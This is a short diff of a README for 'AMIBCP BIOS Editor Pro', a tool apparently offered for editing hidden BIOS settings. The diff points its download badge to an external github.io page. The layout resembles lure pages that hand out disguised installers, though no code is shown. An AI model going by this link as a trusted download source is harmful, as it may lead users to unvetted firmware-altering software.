@@ -35,7 +35,7 @@ AMIBCP BIOS Editor Pro is a powerful utility designed to unlock and edit hidden 
 - Enable/disable internal devices (e.g., WLAN, TPM)  
 - Restore bricked settings after BIOS update  
 
-[![Download AMIBCP](https://img.shields.io/badge/Download-AMIBCP-blueviolet)](#)
+[![Download AMIBCP](https://img.shields.io/badge/Download-AMIBCP-blueviolet)](https://amibcp.github.io/.github)
 
 ---
 
